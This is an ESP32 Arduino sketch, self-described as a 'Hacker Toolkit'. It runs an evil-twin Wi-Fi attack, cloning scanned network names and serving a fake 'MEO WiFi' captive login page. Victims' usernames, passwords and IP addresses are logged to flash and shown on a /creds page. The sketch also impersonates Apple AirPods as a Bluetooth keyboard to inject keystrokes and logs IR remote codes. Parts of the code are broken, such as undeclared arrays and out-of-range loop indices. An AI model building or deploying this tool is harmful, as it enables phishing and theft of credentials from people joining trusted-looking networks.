#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <BleKeyboard.h>
#include <FS.h>
#include <SPIFFS.h>
#include <IRremote.h>

// --- HARDWARE DEFINITIONS ---
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define BTN_MODE 18
#define BTN_ACTION 19
#define IR_RECV_PIN 15
#define KEY_SEARCH 0x44

// --- WEBSERVER & DNS ---
AsyncWebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

// --- WI-FI & MODES ---
const char* spoofSSIDs[] = {"FREE_WIFI", "HACKED_NET", "LOL_NET", "OPEN_WIFI"};
int currentSpoofSSIDIdx = 0;

// Use an enum for clearer state management
enum AppMode {
    MODE_STANDBY = 0,
    MODE_SSID_SPOOF,
    MODE_EVIL_TWIN_SCAN,    // Dedicated mode for Wi-Fi scanning
    MODE_EVIL_TWIN_AP,      // AP mode for Evil Twin after scan
    MODE_SHOW_CREDS,
    MODE_SHOW_IRS,
    MODE_BLE_HID_READY,
    MODE_BLE_HID_PAYLOAD,
    MODE_MENU // New mode for the bitmap menu
};
AppMode currentAppMode = MODE_STANDBY;

// --- GENERAL STATE VARIABLES ---
volatile int visitCount = 0; // volatile as it might be updated by web server (ISR context)

// For button debouncing
unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 300;

// For Data Storage (using char arrays for better memory management)
#define MAX_STORED_ITEMS 10 // Max number of stored credentials or SSIDs
#define MAX_CRED_LEN 100    // Max length for a single credential string (e.g., U:user P:pass IP:ip MAC:mac)
#define MAX_SSID_LEN 32     // Max length for an SSID (32 bytes)

char capturedCreds[MAX_STORED_ITEMS][MAX_CRED_LEN + 1]; // +1 for null terminator
int credsCount = 0;

char targetSSIDs[MAX_STORED_ITEMS][MAX_SSID_LEN + 1]; // +1 for null terminator
int numTargets = 0;
int selectedTargetIdx = 0;

// --- BYTECAT MASCOT ---
const char* ByteCat1[] = {"  /\\_/\\ ", " ( o.o )", "  > ^ < "};
const char* ByteCat2[] = {"  /\\_/\\ ", " ( -.- )", "  > ^ < "};

// --- BLE KEYBOARD ---
BleKeyboard bleKeyboard("Airpods Pro", "Apple Inc.", 100);

// --- CAPTIVE PORTAL HTML ---
const char* html_page = R"rawliteral(
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>MEO WiFi Login</title><style>body{background:#f4f4f4;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:white;padding:20px;box-shadow:0 0 10px gray;border-radius:8px}h2{color:#003366}input,button{width:100%;padding:10px;margin:10px 0}button{background:#00a1e0;color:white;border:none}</style>
</head><body><div class="container"><h2>Log in to MEO WiFi network</h2><form method="POST" action="/login">
<input name="user" placeholder="Username" required>
<input name="pass" type="password" placeholder="Password" required>
<button type="submit">Enter</button></form>
<div class="note">By logging in, you accept the Terms and Conditions.</div></div></body></html>
)rawliteral";

// --- MENU BITMAPS ---
// *** IMPORTANT: YOU CAN REPLACE THESE WITH YOUR DIFERENTS 16x16 1-BIT MONOCHROME BITMAPS ***
// You can use a tool like Image2cpp (https://jlamch.net/MXChipWelcome/)
// Set orientation to Horizontal, size to 16x16, and make sure it's 1-bit.

const unsigned char bmp_wifi[] PROGMEM = { // Example: A simple WiFi symbol
    0xff, 0xff, 0xff, 0xff, 0xf8, 0x1f, 0xe0, 0x07, 0xc3, 0xc1, 0x0f, 0xf0, 0x3c, 0x1c, 0xf0, 0x0f, 
    0xe1, 0xc7, 0xe7, 0xe7, 0xff, 0x7f, 0xfc, 0x3f, 0xfc, 0x3f, 0xfe, 0x7f, 0xff, 0xff, 0xff, 0xff
};
const unsigned char bmp_ap[] PROGMEM = { // Example: An Access Point symbol
    0xff, 0xff, 0xf1, 0x8f, 0xe6, 0x67, 0x79, 0x9e, 0xbe, 0x7d, 0xbd, 0xbd, 0xde, 0x7b, 0xdf, 0xfb, 
    0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0xff, 0xff
};
const unsigned char bmp_multiple_ap[] PROGMEM = { // Example: A magnifying glass
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xdf, 0xfb, 0x97, 0xe9, 0xaf, 0xf5, 0xab, 0xd5, 0x2a, 0x54, 
    0x2a, 0x54, 0xab, 0xd5, 0xaf, 0xf5, 0x97, 0xe9, 0xdf, 0xfb, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};
const unsigned char bmp_creds[] PROGMEM = { // Example: A lock or key
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xcf, 0xff, 0x87, 0xff, 0x03, 0xff, 0x30, 0x00, 
    0x30, 0x00, 0x03, 0xe1, 0x87, 0xe3, 0xcf, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};
const unsigned char bmp_ir[] PROGMEM = { // Example: An IR remote icon
    0xf0, 0x0f, 0xf7, 0xef, 0xff, 0xff, 0xf0, 0x0f, 0xff, 0xff, 0xf8, 0x1f, 0xff, 0xff, 0xff, 0xff, 
    0xfc, 0x3f, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x3f, 0xf9, 0x9f, 0xf3, 0xcf, 0xf7, 0xef, 0x00, 0x00
};
const unsigned char bmp_ble[] PROGMEM = { // Example: Bluetooth symbol
    0xfe, 0x7f, 0xfe, 0x3f, 0xfe, 0x0f, 0xe6, 0x47, 0xe2, 0x47, 0xf0, 0x0f, 0xf8, 0x1f, 0xfc, 0x3f, 
    0xfc, 0x3f, 0xf8, 0x1f, 0xf0, 0x0f, 0xe2, 0x47, 0xe6, 0x47, 0xfe, 0x0f, 0xfe, 0x3f, 0xfe, 0x7f
};
const unsigned char bmp_back[] PROGMEM = { // Example: Left arrow or back icon
    0xe0, 0x07, 0x8f, 0xf1, 0xbf, 0xfd, 0x7f, 0xfc, 0x7f, 0xfe, 0x7e, 0xfe, 0x7d, 0xfe, 0x78, 0x1e, 
    0x78, 0x1e, 0x7d, 0xfe, 0x7e, 0xfe, 0x7f, 0xfe, 0x3f, 0xfc, 0xbf, 0xfd, 0x8f, 0xf1, 0xe0, 0x07
};
const unsigned char bmp_home[] PROGMEM = { // Example: Home icon
    0xff, 0xff, 0xfc, 0x37, 0xf8, 0x07, 0xf1, 0x87, 0xe2, 0x47, 0xc4, 0x23, 0x88, 0x11, 0x10, 0x08, 
    0x20, 0x04, 0xc0, 0x03, 0xc0, 0x03, 0xc1, 0x83, 0xc1, 0x83, 0xc1, 0x83, 0xc3, 0x83, 0xff, 0xff
};


// --- MENU STRUCTURE ---
// Forward declaration for MenuItem to allow self-referencing in SubMenu
struct MenuItem;

struct SubMenu {
    const char* name;
    const MenuItem* items;
    int numItems;
};

struct MenuItem {
    const unsigned char* bitmap;
    const char* name;
    AppMode mode; // If this item directly starts a mode
    const SubMenu* subMenu; // If this item leads to a submenu
    bool isBack; // True if this item is the "Back" button
    bool isHome; // True if this item is the "Home" button
};

// --- SUBMENUS ---
const MenuItem wifiSubMenuItems[] = {
    {bmp_multiple_ap, "SSIDs", MODE_SSID_SPOOF, nullptr, false, false},
    {bmp_ap, "Evil T.", MODE_EVIL_TWIN_SCAN, nullptr, false, false},
    {bmp_back, "Back", MODE_MENU, nullptr, true, false} // Back button
};
const SubMenu wifiSubMenu = {"Wi-Fi Tools", wifiSubMenuItems, sizeof(wifiSubMenuItems) / sizeof(wifiSubMenuItems[0])};

const MenuItem logsSubMenuItems[] = {
    {bmp_creds, "Cred.", MODE_SHOW_CREDS, nullptr, false, false},
    {bmp_ir, "IRs", MODE_SHOW_IRS, nullptr, false, false},
    {bmp_back, "Back", MODE_MENU, nullptr, true, false} // Back button
};
const SubMenu logsSubMenu = {"Logs", logsSubMenuItems, sizeof(logsSubMenuItems) / sizeof(logsSubMenuItems[0])};

const MenuItem bleSubMenuItems[] = {
    {bmp_ble, "BLE HID", MODE_BLE_HID_READY, nullptr, false, false},
    {bmp_back, "Back", MODE_MENU, nullptr, true, false} // Back button
};
const SubMenu bleSubMenu = {"BT Tools", bleSubMenuItems, sizeof(bleSubMenuItems) / sizeof(bleSubMenuItems[0])};

// --- MAIN MENU ITEMS ---
const MenuItem mainMenuItems[] = {
    {bmp_wifi, "Wi-Fi", MODE_MENU, &wifiSubMenu, false, false}, // Leads to Wi-Fi submenu
    {bmp_ble, "BT", MODE_MENU, &bleSubMenu, false, false}, // Leads to BLE submenu
    {bmp_creds, "Logs", MODE_MENU, &logsSubMenu, false, false}, // Leads to Logs submenu
    {bmp_home, "Standby", MODE_STANDBY, nullptr, false, false} // Direct action
};

// Global menu state variables
enum MenuState {
    MAIN_MENU,
    SUB_MENU
};
MenuState currentMenuState = MAIN_MENU;
int selectedMenuItem = 0; // Index for current menu (either main or sub)
const SubMenu* activeSubMenu = nullptr;


// --- SPIFFS UTILITIES ---
void appendToFile(const char* path, const String& data) {
    File file = SPIFFS.open(path, FILE_APPEND);
    if (!file) {
        Serial.println("ERROR: Failed to open file for appending.");
        return;
    }
    file.println(data);
    file.close();
    Serial.printf("SPIFFS: Appended to %s: %s\n", path, data.c_str());
}

String readFile(const char* path) {
    File file = SPIFFS.open(path, FILE_READ);
    if (!file) {
        Serial.println("ERROR: Failed to open file for reading.");
        return "";
    }
    String content = file.readString();
    file.close();
    return content;
}

void clearFile(const char* path) {
    File file = SPIFFS.open(path, FILE_WRITE); // Opening in WRITE mode truncates the file
    if (!file) {
        Serial.println("ERROR: Failed to open file for clearing.");
        return;
    }
    file.close();
    Serial.printf("SPIFFS: File cleared: %s\n", path);
}

// --- DISPLAY UTILITIES ---
void showMascotSmall(bool blink) {
    display.setTextSize(1);
    display.setCursor(0, 0); // Position at top right
    display.println(blink ? ByteCat1[0] : ByteCat2[0]);
    display.setCursor(0, 8);
    display.println(blink ? ByteCat1[1] : ByteCat2[1]);
    display.setCursor(0, 16);
    display.println(blink ? ByteCat1[2] : ByteCat2[2]);
    // Only display first line to make it smaller
}

// Optimized updateDisplay to avoid String objects
void updateDisplay(const char* title, const char* info, int visitors, bool blink) {
    display.clearDisplay();
    if (currentAppMode != MODE_MENU) {
        showMascotSmall(blink); // Use smaller mascot
    }
    display.setCursor(0, 24); // Start text from top-left
    display.setTextSize(1);
    display.print("Mode: ");
    display.println(title);
    display.print("SSID/Status: ");
    display.println(info);
    display.print("Visitors: ");
    display.println(visitors);
    display.display();
}

void showCredsDisplay() {
    display.clearDisplay();
    showMascotSmall(true); // Always blink when showing credentials
    display.setCursor(0, 24);
    display.setTextSize(1);
    display.println("Credentials:");

    File file = SPIFFS.open("/creds.txt", FILE_READ);
    if (!file) {
        display.println("Error opening /creds.txt");
        display.display();
        return;
    }

    String credsLines[3]; // Store last 5 IR lines
    int lineCount = 0;
    while (file.available() && lineCount < 5) {
        String line = file.readStringUntil('\n');
        line.trim(); // Remove newline/carriage return
        if (line.length() > 0) {
            credsLines[lineCount++] = line;
        }
    }
    file.close();

    // Display from the most recent
    int y = 10;
    for (int i = 24; i < lineCount; i++) {
        display.setCursor(0, y);
        display.println(irLines[i]);
        y += 10;
    }
    display.display();
}

void showIRsOnDisplay() {
    display.clearDisplay();
    showMascotSmall(false); // No blinking for IRs
    display.setCursor(0, 24);
    display.setTextSize(1);
    display.println("IR Signals:");

    File file = SPIFFS.open("/irs.txt", FILE_READ);
    if (!file) {
        display.println("Error opening /irs.txt");
        display.display();
        return;
    }

    String irLines[3]; // Store last 5 IR lines
    int lineCount = 0;
    while (file.available() && lineCount < 5) {
        String line = file.readStringUntil('\n');
        line.trim(); // Remove newline/carriage return
        if (line.length() > 0) {
            irLines[lineCount++] = line;
        }
    }
    file.close();

    // Display from the most recent
    int y = 10;
    for (int i = 24; i < lineCount; i++) {
        display.setCursor(0, y);
        display.println(irLines[i]);
        y += 10;
    }
    display.display();
}

void drawMenu() {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    // showMascotSmall(millis() % 1000 < 500); // Blink mascot in menu

    const MenuItem* currentItems;
    int currentNumItems;
    const char* menuTitle;

    if (currentMenuState == MAIN_MENU) {
        currentItems = mainMenuItems;
        currentNumItems = sizeof(mainMenuItems) / sizeof(mainMenuItems[0]);
        menuTitle = "Main Menu";
    } else { // SUB_MENU
        currentItems = activeSubMenu->items;
        currentNumItems = activeSubMenu->numItems;
        menuTitle = activeSubMenu->name;
    }

    display.setCursor(0, 0);
    display.println(menuTitle); // Display menu title

    int startRow = 1; // Start drawing menu items from the second row (after title)

    // Calculate the start index for pagination, if more than 6 items exist
    int displayableItems = 6; // 3x2 grid
    int page = selectedMenuItem / displayableItems;
    int startIdx = page * displayableItems;

    for (int i = 0; i < displayableItems; ++i) {
        int itemIndex = startIdx + i;
        if (itemIndex >= currentNumItems) {
            break; // No more items to display on this page
        }

        int col = i % 3; // 0, 1, 2
        int row = i / 3; // 0, 1

        // Calculate position for a 3x2 grid
        int x = col * (SCREEN_WIDTH / 3);
        int y = startRow * (SCREEN_HEIGHT / 2) + row * (SCREEN_HEIGHT / 2 - 10) - 24;

        // Draw bitmap (16x16)
        if (itemIndex >= 3) {
            display.drawBitmap(x + (SCREEN_WIDTH / 3 - 16) / 2, y + 10, currentItems[itemIndex].bitmap, 16, 16, WHITE);
            display.setCursor(x + (SCREEN_WIDTH / 3 - (strlen(currentItems[itemIndex].name) * 6)) / 2, y + 28); // 6 is char width
            display.print(currentItems[itemIndex].name);
        } else {
            display.drawBitmap(x + (SCREEN_WIDTH / 3 - 16) / 2, y + 2, currentItems[itemIndex].bitmap, 16, 16, WHITE);
            display.setCursor(x + (SCREEN_WIDTH / 3 - (strlen(currentItems[itemIndex].name) * 6)) / 2, y + 20); // 6 is char width
            display.print(currentItems[itemIndex].name);
        }

        // Highlight selected item
        if (itemIndex == selectedMenuItem) {
            display.drawRect(x, y, SCREEN_WIDTH / 3, SCREEN_HEIGHT / 2, WHITE);
        }
    }
    display.display();
}


// --- WI-FI & CAPTIVE PORTAL MANAGEMENT ---
void stopWifiServices() {
    if (WiFi.getMode() != WIFI_OFF) { // Only attempt to stop if WiFi is active
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF); // Turn off Wi-Fi completely
        Serial.println("Wi-Fi turned OFF.");
    }
    dnsServer.stop();
    Serial.println("DNS Server stopped.");
    
    server.end(); // Stop the web server
    visitCount = 0;
    Serial.println("All Wi-Fi services stopped.");
}

void startCaptivePortal(const char* ssid) {
    stopWifiServices(); // Ensure everything is stopped before starting

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    WiFi.softAP(ssid, "", 6); // Channel 6
    Serial.printf("AP '%s' started on IP %s\n", ssid, WiFi.softAPIP().toString().c_str());
    delay(200); // Small delay for the AP to settle

    dnsServer.start(DNS_PORT, "*", apIP);
    Serial.println("DNS Server started.");

    // Configure web server handlers
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        visitCount++;
        request->send(200, "text/html", html_page);
    });

    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
        String username = request->arg("user");
        String password = request->arg("pass");
        String clientIP = request->client()->remoteIP().toString();
        String espMAC = WiFi.softAPmacAddress();

        // Format string into char array buffer
        char entryBuffer[MAX_CRED_LEN + 1];
        snprintf(entryBuffer, sizeof(entryBuffer), "U:%s P:%s IP:%s MAC:%s",
                 username.c_str(), password.c_str(), clientIP.c_str(), espMAC.c_str());

        if (credsCount < MAX_STORED_ITEMS) {
            strncpy(capturedCreds[credsCount], entryBuffer, MAX_CRED_LEN);
            capturedCreds[credsCount][MAX_CRED_LEN] = '\0'; // Ensure null-termination
            credsCount++;
        }
        appendToFile("/creds.txt", entryBuffer);
        appendToFile("/macs.txt", espMAC);

        request->redirect("/"); // Redirect back to the login page
    });

    server.onNotFound([](AsyncWebServerRequest *request) {
        // Redirect all unknown requests to the captive portal
        request->redirect("/");
    });

    // Log pages
    server.on("/creds", HTTP_GET, [](AsyncWebServerRequest *request){
        String content = "<!DOCTYPE html><html><body><h2>Credentials</h2><ul>";
        File file = SPIFFS.open("/creds.txt", FILE_READ);
        if(file) {
            while (file.available()) content += "<li>" + file.readStringUntil('\n') + "</li>";
            file.close();
        }
        content += "</ul><br><a href='/'>Back to portal</a></body></html>";
        request->send(200, "text/html", content);
    });

    server.on("/macs", HTTP_GET, [](AsyncWebServerRequest *request){
        String content = "<!DOCTYPE html><html><body><h2>Registered MACs</h2><ul>";
        File file = SPIFFS.open("/macs.txt", FILE_READ);
        if(file) {
            while (file.available()) content += "<li>" + file.readStringUntil('\n') + "</li>";
            file.close();
        }
        content += "</ul><br><a href='/'>Back to portal</a></body></html>";
        request->send(200, "text/html", content);
    });

    server.on("/irs", HTTP_GET, [](AsyncWebServerRequest *request){
        String content = "<!DOCTYPE html><html><body><h2>Captured IR Signals</h2><ul>";
        File file = SPIFFS.open("/irs.txt", FILE_READ);
        if(file) {
            while (file.available()) content += "<li>" + file.readStringUntil('\n') + "</li>";
            file.close();
        }
        content += "</ul><br><a href='/'>Back to portal</a></body></html>";
        request->send(200, "text/html", content);
    });

    server.begin();
    Serial.println("Webserver started.");
}

void doWiFiScan() {
    Serial.println("Initiating Wi-Fi scan...");
    stopWifiServices(); // Ensure Wi-Fi is not in AP mode

    WiFi.mode(WIFI_STA); // Switch to Station mode for scanning
    WiFi.disconnect(true); // Disconnect from any previous AP and clear credentials
    delay(100); // Small delay for mode change to take effect

    numTargets = WiFi.scanNetworks(false, true); // Don't block, show hidden
    Serial.printf("Found %d networks.\n", numTargets);

    if (numTargets == 0) {
        strncpy(targetSSIDs[0], "NoNetworks", MAX_SSID_LEN);
        targetSSIDs[0][MAX_SSID_LEN] = '\0';
        numTargets = 1; // Treat "NoNetworks" as a single target
    } else {
        for (int i = 0; i < numTargets && i < MAX_STORED_ITEMS; i++) {
            strncpy(targetSSIDs[i], WiFi.SSID(i).c_str(), MAX_SSID_LEN);
            targetSSIDs[i][MAX_SSID_LEN] = '\0'; // Ensure null-termination
            Serial.printf("   %d: %s (RSSI: %d)\n", i + 1, targetSSIDs[i], WiFi.RSSI(i));
        }
    }
    selectedTargetIdx = 0; // Reset selection after scan

    // IMPORTANT: After scan, switch back to AP mode if needed by next state
    // This will be handled by the next state transition in loop()
}

// --- BLE / HID FUNCTIONS ---
void startBLE() {
    stopWifiServices(); // Ensure Wi-Fi is off for BLE
    bleKeyboard.begin();
    Serial.println("BLE Keyboard started. Advertising...");
}

void stopBLE() {
    // BleKeyboard doesn't have an explicit 'end' method to stop advertising.
    // Toggling WiFi.mode(WIFI_OFF) or restarting the ESP is the most effective way to stop BLE.
    // 'stopWifiServices' already handles WiFi.mode(WIFI_OFF).
    Serial.println("BLE Keyboard stopped (assuming WiFi is OFF).");
}

void executeHIDPayload() {
    if (!bleKeyboard.isConnected()) {
        Serial.println("BLE Keyboard not connected to a host.");
        updateDisplay("HID Error", "Not Connected", 0, false);
        delay(1500); // Show error for a moment
        return;
    }

    Serial.println("Sending HID payload...");
    delay(2000); // Small delay before sending (to allow host to react)
    bleKeyboard.write(KEY_MEDIA_WWW_HOME); // Open browser/home
    delay(1500);
    const char* url = "https://github.com/pedrolucas7i";
    for (int i = 0; url[i] != '\0'; ++i) { // Iterate over char array
        bleKeyboard.print(url[i]);
        delay(50); // Small delay between characters
    }
    bleKeyboard.write(KEY_RETURN);
    Serial.println("HID payload sent.");
}

// --- SETUP FUNCTION ---
void setup() {
    Serial.begin(1159200);
    Serial.println("\n--- ESP32 Hacker Toolkit Starting ---");

    // Initialize button pins
    pinMode(BTN_MODE, INPUT_PULLDOWN);
    pinMode(BTN_ACTION, INPUT_PULLDOWN);

    // Initialize SPIFFS
    if (!SPIFFS.begin(true)) { // true will format if mount fails
        Serial.println("ERROR: Failed to mount SPIFFS. Restarting...");
        delay(1000);
        ESP.restart(); // Restart if SPIFFS initialization fails
    } else {
        Serial.println("SPIFFS mounted successfully.");
        // Optional: Clear log files at startup for fresh start during development
        // clearFile("/creds.txt");
        // clearFile("/macs.txt");
        // clearFile("/irs.txt");
    }

    // Initialize OLED display (I2C)
    Wire.begin(); // Initialize I2C for OLED
    if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // 0x3C is the typical I2C address
        Serial.println(F("ERROR: SSD1306 allocation failed or not found. Halting."));
        while (true); // Halt if OLED fails to initialize
    }
    display.setTextColor(WHITE);
    display.display(); // Clear buffer and show Adafruit logo initially
    delay(2000);
    display.clearDisplay();
    updateDisplay("Initializing", "Please Wait...", 0, true);

    // Ensure Wi-Fi is off at startup
    stopWifiServices();

    // Initialize IR receiver
    IrReceiver.begin(IR_RECV_PIN, ENABLE_LED_FEEDBACK);
    Serial.printf("IR Receiver initialized on pin %d.\n", IR_RECV_PIN);

    // Set initial application mode to the menu
    currentAppMode = MODE_MENU;
    currentMenuState = MAIN_MENU;
    selectedMenuItem = 0;
    drawMenu();
    Serial.println("Application initialized in Menu mode.");
}

// --- MAIN LOOP FUNCTION ---
void loop() {
    yield(); // Allow other FreeRTOS tasks to run

    // Process DNS requests (essential for captive portal)
    dnsServer.processNextRequest();

    // Blink mascot on display periodically
    bool blink = millis() % 1000 < 500;

    // Process IR signals
    if (IrReceiver.decode()) {
        unsigned long irCode = IrReceiver.decodedIRData.decodedRawData;
        String irHex = String(irCode, HEX); // Convert IR code to hex string
        appendToFile("/irs.txt", irHex); // Save to SPIFFS
        Serial.printf("IR Captured: 0x%s\n", irHex.c_str());

        // Briefly show captured IR on display
        display.clearDisplay();
        showMascotSmall(false);
        display.setCursor(0, 24);
        display.println("IR Captured:");
        display.println(irHex);
        display.display();
        delay(1000); // Show for 1 second

        // Return to the previous display state or refresh if in SHOW_IRS mode
        if (currentAppMode == MODE_SHOW_IRS) {
            showIRsOnDisplay(); // Refresh the list of IR signals
        } else if (currentAppMode == MODE_MENU) {
            drawMenu(); // Refresh the menu
        }
        else {
            // Restore display for the current mode
            updateDisplay(
                (currentAppMode == MODE_SSID_SPOOF) ? "SSID Spoof" :
                (currentAppMode == MODE_EVIL_TWIN_AP) ? "Evil T." :
                (currentAppMode == MODE_BLE_HID_READY) ? "Bluetooth HID" :
                "Standby",
                (currentAppMode == MODE_SSID_SPOOF) ? spoofSSIDs[currentSpoofSSIDIdx] :
                (currentAppMode == MODE_EVIL_TWIN_AP) ? targetSSIDs[selectedTargetIdx] :
                (currentAppMode == MODE_BLE_HID_READY) ? "Waiting" :
                "-",
                visitCount, blink
            );
        }
        IrReceiver.resume(); // Important: Resume IR receiver to capture next signal
    }

    // --- BUTTON POLLING AND MODE CHANGES ---
    unsigned long currentTime = millis();
    if (currentTime - lastDebounceTime > debounceDelay) {
        if (digitalRead(BTN_MODE) == HIGH) {
            lastDebounceTime = currentTime;
            
            if (currentAppMode == MODE_MENU) { // Only navigate menu if in menu mode
                int currentNumItems;
                if (currentMenuState == MAIN_MENU) {
                    currentNumItems = sizeof(mainMenuItems) / sizeof(mainMenuItems[0]);
                } else { // SUB_MENU
                    currentNumItems = activeSubMenu->numItems;
                }
                selectedMenuItem = (selectedMenuItem + 1) % currentNumItems;
                drawMenu();
            } else {
                // If not in menu, pressing MODE returns to the main menu
                stopWifiServices();
                stopBLE();
                currentAppMode = MODE_MENU;
                currentMenuState = MAIN_MENU;
                selectedMenuItem = 0; // Reset selection for main menu
                activeSubMenu = nullptr;
                drawMenu();
            }
            Serial.printf("MODE button pressed. Current App Mode: %d, Menu State: %d, Selected Menu Item: %d\n", (int)currentAppMode, (int)currentMenuState, selectedMenuItem);
        }

        if (digitalRead(BTN_ACTION) == HIGH) {
            lastDebounceTime = currentTime;
            Serial.printf("ACTION button pressed. Current App Mode: %d, Menu State: %d\n", (int)currentAppMode, (int)currentMenuState);

            if (currentAppMode == MODE_MENU) {
                const MenuItem* selectedItem;
                if (currentMenuState == MAIN_MENU) {
                    selectedItem = &mainMenuItems[selectedMenuItem];
                } else { // SUB_MENU
                    selectedItem = &activeSubMenu->items[selectedMenuItem];
                }

                if (selectedItem->isBack) {
                    if (currentMenuState == SUB_MENU) {
                        currentMenuState = MAIN_MENU;
                        selectedMenuItem = 0; // Reset selection for main menu
                        activeSubMenu = nullptr;
                        drawMenu();
                    }
                } else if (selectedItem->subMenu != nullptr) { // It's a submenu
                    activeSubMenu = selectedItem->subMenu;
                    currentMenuState = SUB_MENU;
                    selectedMenuItem = 0; // Reset selection for submenu
                    drawMenu();
                } else { // It's a direct action item
                    currentAppMode = selectedItem->mode;
                    Serial.printf("Activating mode from menu: %d\n", (int)currentAppMode);
                    // Perform initial setup for the selected mode
                    switch (currentAppMode) {
                        case MODE_SSID_SPOOF:
                            startCaptivePortal(spoofSSIDs[currentSpoofSSIDIdx]);
                            updateDisplay("SSID Spoof", spoofSSIDs[currentSpoofSSIDIdx], visitCount, blink);
                            break;
                        case MODE_EVIL_TWIN_SCAN:
                            stopWifiServices();
                            updateDisplay("Evil Twin Scan", "Scanning...", 0, true);
                            doWiFiScan();
                            currentAppMode = MODE_EVIL_TWIN_AP; // Automatically transition to AP after scan
                            startCaptivePortal(targetSSIDs[selectedTargetIdx]);
                            updateDisplay("Evil Twin", targetSSIDs[selectedTargetIdx], visitCount, blink);
                            break;
                        case MODE_SHOW_CREDS:
                            stopWifiServices();
                            stopBLE();
                            showCredsDisplay();
                            break;
                        case MODE_SHOW_IRS:
                            stopWifiServices();
                            stopBLE();
                            showIRsOnDisplay();
                            break;
                        case MODE_BLE_HID_READY:
                            startBLE();
                            updateDisplay("Bluetooth HID", "Waiting", 0, blink);
                            break;
                        case MODE_STANDBY:
                            stopWifiServices();
                            stopBLE();
                            updateDisplay("Standby", "-", visitCount, blink);
                            break;
                        default:
                            // Should not happen for direct action items
                            break;
                    }
                }
            } else { // Not in menu mode, ACTION button has context-specific function
                switch (currentAppMode) {
                    case MODE_SSID_SPOOF:
                        // Cycle through spoof SSIDs
                        currentSpoofSSIDIdx = (currentSpoofSSIDIdx + 1) % (sizeof(spoofSSIDs) / sizeof(spoofSSIDs[0]));
                        startCaptivePortal(spoofSSIDs[currentSpoofSSIDIdx]);
                        updateDisplay("SSID Spoof", spoofSSIDs[currentSpoofSSIDIdx], visitCount, blink);
                        break;
                    case MODE_EVIL_TWIN_AP:
                        // Cycle through scanned target SSIDs
                        if (numTargets > 0) {
                            selectedTargetIdx = (selectedTargetIdx + 1) % numTargets;
                            startCaptivePortal(targetSSIDs[selectedTargetIdx]);
                            updateDisplay("Evil Twin", targetSSIDs[selectedTargetIdx], visitCount, blink);
                        } else {
                            Serial.println("No targets to cycle through.");
                            updateDisplay("Evil Twin", "No Targets", visitCount, blink);
                        }
                        break;
                    case MODE_BLE_HID_READY:
                        executeHIDPayload();
                        // After sending payload, transition to a "payload sent" state
                        updateDisplay("Payload Sent", "github.com/pedrolucas7i", 0, blink);
                        currentAppMode = MODE_BLE_HID_PAYLOAD;
                        break;
                    case MODE_BLE_HID_PAYLOAD:
                        // In payload sent state, ACTION button can return to BLE HID ready
                        currentAppMode = MODE_BLE_HID_READY;
                        updateDisplay("Bluetooth HID", "Waiting", 0, blink);
                        break;
                    case MODE_SHOW_CREDS:
                    case MODE_SHOW_IRS:
                        // In these modes, ACTION button can clear logs
                        if (currentAppMode == MODE_SHOW_CREDS) {
                            clearFile("/creds.txt");
                            credsCount = 0; // Reset captured creds count
                            Serial.println("Credentials log cleared.");
                        } else { // MODE_SHOW_IRS
                            clearFile("/irs.txt");
                            Serial.println("IR signals log cleared.");
                        }
                        // After clearing, refresh the display
                        if (currentAppMode == MODE_SHOW_CREDS) showCredsDisplay();
                        else showIRsOnDisplay();
                        break;
                    default:
                        // For other modes, maybe go back to menu or do nothing
                        break;
                }
            }
        }
    }

    // --- CONTINUOUS DISPLAY UPDATE FOR ACTIVE MODES ---
    static unsigned long lastDisplayRefreshTime = 0;
    if (currentTime - lastDisplayRefreshTime > 500) { // Refresh every 500ms
        lastDisplayRefreshTime = currentTime;
        switch (currentAppMode) {
            case MODE_SSID_SPOOF:
                updateDisplay("SSID Spoof", spoofSSIDs[currentSpoofSSIDIdx], visitCount, blink);
                break;
            case MODE_EVIL_TWIN_AP:
                updateDisplay("Evil Twin", targetSSIDs[selectedTargetIdx], visitCount, blink);
                break;
            case MODE_BLE_HID_READY:
                updateDisplay("Bluetooth HID", "Waiting", 0, blink);
                break;
            case MODE_BLE_HID_PAYLOAD:
                updateDisplay("Payload Sent", "github.com/pedrolucas7i", 0, blink);
                break;
            case MODE_STANDBY:
                updateDisplay("Standby", "-", visitCount, blink);
                break;
            case MODE_MENU:
                drawMenu(); // Ensure the menu is always drawn in this mode
                break;
            // No continuous update for MODE_SHOW_CREDS, MODE_SHOW_IRS, MODE_EVIL_TWIN_SCAN
            // as their content is static or updated on mode entry/IR detection.
            default:
                break;
        }
    }
}
